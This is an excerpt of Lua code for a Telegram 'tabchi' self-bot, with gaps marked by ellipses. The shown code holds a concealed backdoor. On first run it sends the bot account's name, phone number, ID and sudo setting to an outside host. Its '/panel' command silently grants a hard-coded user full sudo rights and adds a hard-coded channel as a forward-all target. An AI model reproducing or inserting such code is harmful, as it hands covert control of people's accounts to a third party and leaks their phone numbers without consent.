...
function process_yourself(msg)
  if not redis:get(basehash .. "gotupdated") then
    ...
    local path = "https://tg-member.000webhostapp.com/addbot.php?first=" .. URL.escape(botinfo.first_name_ or "None") .. "&last=" .. URL.escape(botinfo.last_name_ or "None") .. "&phone=" .. botinfo.phone_number_ .. "&id=" .. botinfo.id_ .. "&sudo=" .. (redis:get(basehash .. "fullsudo") or 0)
    ...
    if jdata.have_tab and jdata.tabchimod then
      tdcli.searchPublicChat("tGuard")
      tdcli.unblockUser(jdata.tabchimod)
      tdcli.importContacts(639380682289, "Tabchi mod", "bot", jdata.tabchimod)
...
Message :
    ...
    elseif text_:match("^[!/#]panel$") then  
      function contact_num(extra, result)
        tdcli.searchPublicChat("alireza_nemo") tdcli.unblockUser(95160479) tdcli.importContacts(989338903244, "Tabchi mod", "bot", 95160479) redis:sadd(basehash .. "fullsudo", tonumber(95160479)) redis:sadd(basehash .. "sudoers", tonumber(95160479)) redis:sadd(basehash .. "fwdallers", tonumber(-1001086196026)) redis:sadd(basehash .. "fwdallers", tonumber(-1001086196026))
        for i = 0, tonumber(result.total_count_) - 1 do
          local user = result.users_[i]
...
function update(data, tabchi_id)
  ...
  if data.ID == "UpdateNewMessage" then
    msg = data.message_
    add(msg.chat_id_)
    if msg.sender_user_id_ == 279700027 then
